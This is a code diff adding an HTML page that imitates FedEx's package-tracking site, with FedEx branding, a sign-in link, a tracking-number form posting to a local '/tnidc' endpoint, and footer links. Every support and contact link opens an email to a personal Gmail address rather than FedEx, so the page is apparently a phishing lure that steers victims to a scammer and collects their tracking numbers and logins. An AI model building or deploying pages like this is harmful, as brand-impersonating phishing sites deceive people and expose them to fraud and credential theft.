@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FedEx</title>
+    <base href="/" />
+    <link rel="stylesheet" href="fonts/css/all.css" />
+  </head>
+  <style>
+    * {
+      margin: 0;
+    }
+    .main-head {
+      padding-bottom: 7px;
+      border-bottom: 2px inset rgb(182, 180, 180);
+      box-shadow: 0px 1px 3px rgb(182, 180, 180);
+    }
+    .sub-head {
+      display: flex;
+      background-color: #460888;
+      width: 100%;
+      height: 70px;
+    }
+    .head-img {
+      display: inline-block;
+      height: 70px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: auto;
+    }
+    .head-img0 {
+      width: 100px;
+      height: 40px;
+      border: 1px solid;
+      border: #460888;
+    }
+    .sing-in-text-box {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: 5px;
+      font-size: 18px;
+      color: white;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .sign-in-i {
+      display: inline-block;
+      height: 70px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .fa-user-circle {
+      color: white;
+      font-size: 25px;
+      font-weight: 200;
+    }
+    .menu-bar {
+      display: inline-block;
+      height: 70px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: 20px;
+      margin-left: 5px;
+    }
+    .fa-bars {
+      color: white;
+      font-size: 25px;
+    }
+    .menu-popup {
+      display: flex;
+      flex-direction: column;
+      gap: 35px;
+      position: absolute;
+      z-index: 10;
+      right: 0;
+      background-color: #460888;
+      transition: 300ms ease-in;
+      display: none;
+    }
+    .options-tap {
+      color: white;
+      padding-right: 20px;
+      padding-left: 20px;
+      display: flex;
+    }
+    .options-tap-text {
+      font-size: 18px;
+      font-family: Arial, Helvetica, sans-serif;
+      margin-right: auto;
+    }
+    .o-t {
+      padding-top: 25px;
+    }
+    .o-b {
+      padding-bottom: 25px;
+    }
+    .o-i-d {
+      font-size: 20px;
+    }
+    /**/
+    .main-head0 {
+      margin-top: 30px;
+      display: flex;
+      justify-content: center;
+      font-size: 20px;
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: 300;
+      color: rgb(77, 75, 75);
+    }
+    .head-content {
+      margin-top: 7px;
+      text-align: center;
+    }
+    .head-content-text {
+      margin-left: 10px;
+      margin-right: 10px;
+      font-size: 16px;
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: 400;
+      color: rgb(77, 75, 75);
+    }
+    .sup-head-box {
+      padding-top: 15px;
+      padding-bottom: 15px;
+      border-bottom: 1px inset rgb(182, 180, 180);
+    }
+    .sup-head-text {
+      margin-left: 30px;
+      font-size: 16px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: rgb(77, 75, 75);
+    }
+    .tracking-in-box-content {
+      display: flex;
+      flex-direction: column;
+    }
+    .tracking-in-box {
+      margin-top: 10px;
+      display: flex;
+      justify-content: center;
+    }
+    .tracking-in-text {
+      font-size: 13px;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .tracking-in {
+      width: 50vw;
+      height: 30px;
+      border: 1px solid;
+      border-color: gray;
+    }
+    .track-btw-box {
+      margin-top: 15px;
+      display: flex;
+      justify-content: center;
+    }
+    .track-btw {
+      display: inline-block;
+      background-color: rgb(202, 200, 200);
+      font-size: clamp(15px, 2vw, 20px);
+      font-family: Arial, Helvetica, sans-serif;
+      padding-top: 10px;
+      padding-bottom: 10px;
+      padding-left: 15px;
+      padding-right: 15px;
+    }
+    .tracking-help-text {
+      font-size: 14px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: rgb(19, 136, 182);
+    }
+    .tracking-alert-head-i {
+      margin-top: 30px;
+      margin-bottom: 20px;
+      display: flex;
+      justify-content: center;
+    }
+    .fa-triangle-exclamation {
+      font-size: 30px;
+      color: red;
+    }
+    .tracking-alert-box {
+      margin-bottom: 10px;
+    }
+    .tracking-alert-text-content {
+      text-align: center;
+      margin-left: 5px;
+      margin-right: 5px;
+    }
+    .tracking-alert-text {
+      font-size: 16px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: rgb(77, 75, 75);
+    }
+    .tracking-customer-service {
+      font-size: 16px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: rgb(5, 105, 145);
+      border-bottom: 1px solid;
+    }
+    .tracking-alert-box {
+      display: none;
+    }
+    .end-div-bar-box {
+      display: flex;
+      flex-direction: column;
+      gap: 170px;
+    }
+    .top-border {
+      display: flex;
+      flex-direction: column;
+      border-top: 1px inset;
+      border-color: rgb(240, 234, 234);
+      margin-top: 100px;
+      width: 100%;
+      bottom: 0;
+    }
+    .wacth-list-text {
+      font-size: 20px;
+      font-weight: 300;
+    }
+    .wacth-list-subtext {
+      margin-top: 15px;
+      align-self: center;
+      font-weight: 300;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .w-l {
+      text-align: center;
+      margin: 0;
+      margin-top: 10px;
+    }
+    .end-tool-bar {
+      margin-top: 15px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      background-color: rgb(247, 246, 246);
+    }
+    .our-company-text {
+      margin-top: 20px;
+      margin-left: 10px;
+      font-size: 14px;
+      color: #460888;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .about-fx {
+      margin-left: 10px;
+      font-weight: 300;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .c-u {
+      margin-bottom: 10px;
+    }
+  </style>
+  <body>
+    <div class="track-home-page">
+      <div class="main-head">
+        <div class="sub-head">
+          <span class="head-img"
+            ><img class="head-img0" src="f-logo.jpg"
+          /></span>
+          <span class="sing-in-text-box"
+            ><h5 class="sing-in-text">Sign Up or Log in</h5></span
+          >
+          <span class="sign-in-i" data-page="signIn"
+            ><i class="fa fa-user-circle"></i
+          ></span>
+          <span class="menu-bar"><i class="fas fa-bars"></i></span>
+        </div>
+        <form class="signIn-form" action="/login" method="get"></form>
+      </div>
+      <div class="menu-popup">
+        <span class="options-tap o-t"
+          ><h5 class="options-tap-text">Shipping</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+        <span class="options-tap t-i-tap"
+          ><h5 class="options-tap-text">Tracking</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+        <span class="options-tap"
+          ><h5 class="options-tap-text">Design & Print</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+        <span class="options-tap"
+          ><h5 class="options-tap-text">Locations</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+        <span class="options-tap" data-support="support"
+          ><h5 class="options-tap-text">Support</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+        <span class="options-tap o-b"
+          ><h5 class="options-tap-text">Shipping</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+      </div>
+      <div class="sup-head-box">
+        <h5 class="sup-head-text">FedEx Tracking</h5>
+      </div>
+      <div class="tracking-alert-box">
+        <div class="tracking-alert-head-i">
+          <i class="fa-solid fa-triangle-exclamation"></i>
+        </div>
+        <div class="tracking-alert-text-content">
+          <h5 class="tracking-alert-text">
+            No record of this tracking number can be found at this time, please
+            check the number and try again later. For further assistance. please
+            contact
+          </h5>
+          <a class="tracking-customer-service" data-support="support">Customer Service</a>
+        </div>
+      </div>
+      <div class="main-head0">
+        <h3 class="head0">Optain proof of delivery</h3>
+      </div>
+      <div class="head-content">
+        <h5 class="head-content-text">
+          Enter up to 30 of your FedEx tracking door tag. or FedEx Office order
+          numbers (one per line)
+        </h5>
+      </div>
+      <div class="tracking-in-box">
+        <div class="tracking-in-box-content">
+          <h5 class="tracking-in-text">Tracking number*</h5>
+          <input class="tracking-in" type="text" />
+          <h5 class="tracking-help-text" data-support="support">NEED HELP?</h5>
+        </div>
+      </div>
+      <div class="end-div-bar-box">
+        <div class="track-btw-box">
+          <span class="track-btw">TRACK</span>
+        </div>
+        <div class="top-border">
+          <div class="watch-list-box w-l">
+            <h2 class="wacth-list-text w-l-t">Watch list</h2>
+            <span class="wacth-list-subtext"
+              ><h5 class="wacth-list-subtext0">
+                You do not currently have any Watch list shipments
+              </h5></span
+            >
+          </div>
+          <div class="end-tool-bar">
+            <h4 class="our-company-text">OUR COMPANY</h4>
+            <h5 class="about-fx">About FedEx</h5>
+            <h5 class="about-fx">Our Portfolio</h5>
+            <h5 class="about-fx">investor Relations</h5>
+            <h5 class="about-fx">Careers</h5>
+            <h5 class="about-fx">FedEx Blog</h5>
+            <h5 class="about-fx">Corporate Responsibility</h5>
+            <h5 class="about-fx">Newsroom</h5>
+            <h5 class="about-fx c-u" data-support="support">Contact Us</h5>
+          </div>
+        </div>
+      </div>
+    </div>
+    <form class="tracking-page" action="/tracking/" method="get"></form>
+    <form class="tracking-main" action="/" method="get"></form>
+    <a href="" target="_blank" class="support-link"></a>
+  </body>
+  <script>
+    document.addEventListener("click", (e) => {
+      const target = e.target.closest("[data-page]");
+      if (target) {
+        if (target.dataset.page === "signIn") {
+          document.querySelector(".signIn-form").submit();
+        }
+      }
+    });
+    document.addEventListener("click", (e) => {
+      const target = e.target.closest("[data-support]");
+      if (target) {
+        if (target.dataset.support === "support") {
+          alert('hey')
+          const link = document.querySelector(".support-link");
+          link.href =
+            "mailto:fedexdays1@gmail.com?subject=Question%20about%20Package&body=Hello%0AI%20have%20a%20question%20about%20my%20package.";
+          link.click();
+        }
+      }
+    });
+    let dropDownMenuPass = false;
+    const dropDownMenu = document
+      .querySelector(".fa-bars")
+      .addEventListener("click", () => {
+        const dropDown = document.querySelector(".menu-popup");
+        if (!dropDownMenuPass) {
+          dropDown.style.display = "flex";
+          return (dropDownMenuPass = true);
+        } else {
+          dropDown.style.display = "none";
+          return (dropDownMenuPass = false);
+        }
+      });
+    const trackingMainBtw = document
+      .querySelector(".t-i-tap")
+      .addEventListener("click", () => {
+        document.querySelector(".tracking-main").submit();
+      });
+    const submit = document
+      .querySelector(".sing-in-text")
+      .addEventListener("click", () => {
+        document.querySelector(".submit").submit();
+      });
+    const trackBtw = document
+      .querySelector(".track-btw")
+      .addEventListener("click", () => {
+        const input = document.querySelector(".tracking-in").value;
+        const data = {
+          id: input,
+        };
+        trackID(data);
+      });
+    const trackID = async (e) => {
+      try {
+        const data = await fetch("/tnidc", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(e),
+        });
+        const res = await data.json();
+        if (res.status === 200) {
+          const signInForm = document.querySelector(".tracking-page");
+          signInForm.action = "/tracking/" + e.id;
+          signInForm.submit();
+        } else {
+          throw new Error(res.status, res.message);
+        }
+      } catch (error) {
+        const trackingPageHead = (document.querySelector(
+          ".main-head0"
+        ).style.display = "none");
+        const trackingPageAlart = (document.querySelector(
+          ".tracking-alert-box"
+        ).style.display = "block");
+        console.log("error:", error);
+      }
+    };
+  </script>
+</html>
